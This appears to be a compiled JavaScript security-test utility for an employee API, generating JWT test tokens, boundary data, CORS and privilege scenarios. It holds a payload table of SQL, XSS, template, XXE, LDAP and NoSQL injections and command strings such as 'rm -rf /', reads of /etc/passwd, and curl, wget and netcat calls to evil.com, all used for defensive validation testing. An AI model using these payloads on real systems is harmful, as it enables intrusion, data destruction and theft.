"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.SecurityAssertions = exports.SecurityTestUtils = void 0;
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const crypto_1 = __importDefault(require("crypto"));
class SecurityTestUtils {
    static generateTestToken(user, secret = this.DEFAULT_JWT_SECRET, options = {}) {
        const defaultOptions = {
            expiresIn: '24h',
            issuer: 'security-test',
            audience: 'test-api'
        };
        return jsonwebtoken_1.default.sign({
            userId: user.id,
            email: user.email,
            role: user.role,
            ...options.claims
        }, secret, { ...defaultOptions, ...options });
    }
    static generateExpiredToken(user, secret = this.DEFAULT_JWT_SECRET) {
        return jsonwebtoken_1.default.sign({
            userId: user.id,
            email: user.email,
            role: user.role,
            exp: Math.floor(Date.now() / 1000) - 3600
        }, secret);
    }
    static generateInvalidSignatureToken(user) {
        return jsonwebtoken_1.default.sign(user, 'wrong-secret-key');
    }
    static generateMalformedToken() {
        return 'malformed.jwt.token.here';
    }
    static generateTamperedToken(user, secret = this.DEFAULT_JWT_SECRET) {
        const validToken = this.generateTestToken(user, secret);
        return validToken.slice(0, -5) + 'XXXXX';
    }
    static createAttackPayloads(basePayload, field, attackType) {
        const payloads = this.MALICIOUS_PAYLOADS[attackType];
        return payloads.map(payload => ({
            ...basePayload,
            [field]: payload
        }));
    }
    static validateResponseSafety(responseBody) {
        const responseStr = JSON.stringify(responseBody);
        if (responseStr.includes('<script>') || responseStr.includes('javascript:')) {
            return false;
        }
        const sqlKeywords = ['SELECT', 'DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION'];
        if (sqlKeywords.some(keyword => responseStr.toUpperCase().includes(keyword))) {
            return false;
        }
        const sensitiveInfo = ['database', 'password', 'secret', 'token', 'key', 'stack', 'trace'];
        if (sensitiveInfo.some(info => responseStr.toLowerCase().includes(info))) {
            return false;
        }
        return true;
    }
    static generateSafeTestData() {
        return {
            firstName: `Test${crypto_1.default.randomInt(1000, 9999)}`,
            lastName: `User${crypto_1.default.randomInt(1000, 9999)}`,
            email: `test${crypto_1.default.randomInt(1000, 9999)}@security-test.com`,
            position: 'Test Developer',
            departmentId: '123e4567-e89b-12d3-a456-426614174000',
            salary: crypto_1.default.randomInt(30000, 150000)
        };
    }
    static createRateLimitTestRequests(requestFunction, count) {
        return Array(count).fill(null).map(() => requestFunction());
    }
    static async measureResponseTime(requestFunction) {
        const startTime = Date.now();
        const response = await requestFunction();
        const duration = Date.now() - startTime;
        return { response, duration };
    }
    static validateSecurityHeaders(headers) {
        const requiredHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security'
        ];
        const missing = requiredHeaders.filter(header => !headers[header]);
        return {
            valid: missing.length === 0,
            missing
        };
    }
    static generateTestUUID() {
        return crypto_1.default.randomUUID();
    }
    static generateInvalidUUIDs() {
        return [
            'invalid-uuid',
            '123',
            '123e4567-e89b-12d3-a456',
            '123e4567-e89b-12d3-a456-42661417400g',
            'not-a-uuid-at-all',
            '00000000-0000-0000-0000-000000000000',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            ''
        ];
    }
    static createBoundaryTestData() {
        return [
            { firstName: '', lastName: '', email: '', position: '', salary: 0 },
            { firstName: 'ab', lastName: 'cd', email: 'a@b.co', position: 'ef', salary: 1 },
            { firstName: 'a'.repeat(50), lastName: 'b'.repeat(50), email: 'test@example.com', position: 'c'.repeat(100), salary: 9999999 },
            { firstName: 'a'.repeat(51), lastName: 'b'.repeat(51), email: 'test@example.com', position: 'c'.repeat(101), salary: 10000001 },
            { firstName: null, lastName: null, email: null, position: null, salary: null },
            { firstName: undefined, lastName: undefined, email: undefined, position: undefined, salary: undefined }
        ];
    }
    static generateTestIPs(count) {
        return Array(count).fill(null).map((_, index) => `192.168.1.${index + 1}`);
    }
    static createCORSTestScenarios() {
        return [
            { origin: 'http://localhost:3000', shouldAllow: true },
            { origin: 'http://localhost:3001', shouldAllow: true },
            { origin: 'http://127.0.0.1:3001', shouldAllow: true },
            { origin: 'http://evil.com', shouldAllow: false },
            { origin: 'https://attacker.net', shouldAllow: false },
            { origin: 'http://localhost:3000.evil.com', shouldAllow: false },
            { origin: 'null', shouldAllow: false },
            { origin: 'http://localhost:8080', shouldAllow: false }
        ];
    }
    static generateInputValidationTests() {
        return [
            { input: 'valid-name', expectValid: true, description: 'Valid string input' },
            { input: 'test@example.com', expectValid: true, description: 'Valid email' },
            { input: 50000, expectValid: true, description: 'Valid salary' },
            { input: '<script>alert("XSS")</script>', expectValid: false, description: 'XSS payload' },
            { input: "'; DROP TABLE users; --", expectValid: false, description: 'SQL injection' },
            { input: '../../../etc/passwd', expectValid: false, description: 'Path traversal' },
            { input: 'a'.repeat(1000), expectValid: false, description: 'Excessively long string' },
            { input: -1, expectValid: false, description: 'Negative number where positive expected' },
            { input: null, expectValid: false, description: 'Null value' },
            { input: undefined, expectValid: false, description: 'Undefined value' },
            { input: {}, expectValid: false, description: 'Object where string expected' },
            { input: [], expectValid: false, description: 'Array where string expected' }
        ];
    }
    static createPrivilegeEscalationTests() {
        return [
            { user: this.USERS.admin, action: 'delete-user', expectAllowed: true },
            { user: this.USERS.admin, action: 'create-admin', expectAllowed: true },
            { user: this.USERS.admin, action: 'view-all-data', expectAllowed: true },
            { user: this.USERS.manager, action: 'create-project', expectAllowed: true },
            { user: this.USERS.manager, action: 'delete-user', expectAllowed: false },
            { user: this.USERS.manager, action: 'create-admin', expectAllowed: false },
            { user: this.USERS.user, action: 'view-own-data', expectAllowed: true },
            { user: this.USERS.user, action: 'create-project', expectAllowed: false },
            { user: this.USERS.user, action: 'delete-user', expectAllowed: false },
            { user: this.USERS.user, action: 'view-all-data', expectAllowed: false },
            { user: this.USERS.guest, action: 'view-public-data', expectAllowed: true },
            { user: this.USERS.guest, action: 'view-own-data', expectAllowed: false },
            { user: this.USERS.guest, action: 'create-project', expectAllowed: false }
        ];
    }
    static async cleanup() {
        process.env.NODE_ENV = 'test';
        process.env.JWT_SECRET = this.DEFAULT_JWT_SECRET;
    }
    static generateSecurityTestReport(results) {
        const passed = results.filter(r => r.passed).length;
        const failed = results.filter(r => !r.passed).length;
        const total = results.length;
        let report = `
🔐 Security Test Report
======================
Total Tests: ${total}
Passed: ${passed}
Failed: ${failed}
Success Rate: ${((passed / total) * 100).toFixed(2)}%

`;
        if (failed > 0) {
            report += '\n❌ Failed Tests:\n';
            results.filter(r => !r.passed).forEach(test => {
                report += `- ${test.name}: ${test.error}\n`;
            });
        }
        report += '\n✅ Security Recommendations:\n';
        report += '- Regular security audits\n';
        report += '- Keep dependencies updated\n';
        report += '- Implement proper logging and monitoring\n';
        report += '- Use HTTPS in production\n';
        report += '- Implement proper session management\n';
        report += '- Regular penetration testing\n';
        return report;
    }
}
exports.SecurityTestUtils = SecurityTestUtils;
SecurityTestUtils.DEFAULT_JWT_SECRET = 'test-super-secret-key-for-security-tests';
SecurityTestUtils.USERS = {
    admin: { id: 'admin-123', email: 'admin@security-test.com', role: 'admin' },
    manager: { id: 'manager-123', email: 'manager@security-test.com', role: 'manager' },
    user: { id: 'user-123', email: 'user@security-test.com', role: 'user' },
    guest: { id: 'guest-123', email: 'guest@security-test.com', role: 'guest' }
};
SecurityTestUtils.MALICIOUS_PAYLOADS = {
    sql: [
        "'; DROP TABLE employees; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1'; --",
        "' UNION SELECT * FROM information_schema.tables --",
        "1; EXEC sp_msforeachtable 'DROP TABLE ?'",
        "' OR 1=1#",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; SHUTDOWN; --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT table_name FROM information_schema.tables --"
    ],
    xss: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<div onclick="alert(1)">Click me</div>',
        '<style>@import"javascript:alert(1)"</style>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<applet code="malicious.class">',
        '<form><button formaction="javascript:alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>'
    ],
    injection: [
        '../../../etc/passwd',
        '../../../../windows/system32/config/sam',
        '../config/database.json',
        '${7*7}',
        '{{7*7}}',
        '#{7*7}',
        '<%=7*7%>',
        '<%= File.open("/etc/passwd").read %>',
        '${jndi:ldap://evil.com/x}',
        '{{constructor.constructor("alert(1)")()}}',
        '${__import__("os").system("id")}',
        '#{File.read("/etc/passwd")}',
        '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}'
    ],
    command: [
        '; rm -rf /',
        '$(whoami)',
        '`cat /etc/passwd`',
        '&& netstat -an',
        '| cat /etc/hosts',
        '; cat /proc/version',
        '$(ping -c 1 google.com)',
        '`ls -la`',
        '; sleep 10',
        '&& curl http://evil.com',
        '| nc -l 8080',
        '; wget http://evil.com/malware'
    ],
    xxe: [
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><data>&xxe;</data>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><data></data>'
    ],
    ldap: [
        '*)(uid=*))(|(uid=*',
        '*)(&(password=*))',
        '*)(|(objectClass=*',
        '*))(objectClass=user))&(uid=*',
        '*)(|(cn=*))'
    ],
    nosql: [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.credits == this.debits"}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}',
        '{"username": {"$regex": "^admin"}}',
        '{"$where": "function(){return true}"}',
        '{"username": {"$exists": true}}',
        '{"password": {"$in": ["", "password", "123456"]}}'
    ]
};
class SecurityAssertions {
    static assertNoXSS(responseBody) {
        const responseStr = JSON.stringify(responseBody);
        expect(responseStr).not.toContain('<script>');
        expect(responseStr).not.toContain('javascript:');
        expect(responseStr).not.toContain('onerror=');
        expect(responseStr).not.toContain('onload=');
    }
    static assertNoSQLLeakage(responseBody) {
        const responseStr = JSON.stringify(responseBody).toLowerCase();
        expect(responseStr).not.toMatch(/\b(select|insert|update|delete|drop|create|alter|truncate)\b/);
    }
    static assertSecurityHeaders(headers) {
        expect(headers['x-content-type-options']).toBe('nosniff');
        expect(headers['x-frame-options']).toBeDefined();
        expect(headers['x-xss-protection']).toBeDefined();
    }
    static assertResponseTime(duration, maxDuration = 5000) {
        expect(duration).toBeLessThan(maxDuration);
    }
    static assertNoSensitiveData(responseBody) {
        const responseStr = JSON.stringify(responseBody).toLowerCase();
        const sensitiveTerms = ['password', 'secret', 'token', 'key', 'api_key', 'private'];
        sensitiveTerms.forEach(term => {
            expect(responseStr).not.toContain(term);
        });
    }
}
exports.SecurityAssertions = SecurityAssertions;
exports.default = SecurityTestUtils;
//# sourceMappingURL=security-utils.js.map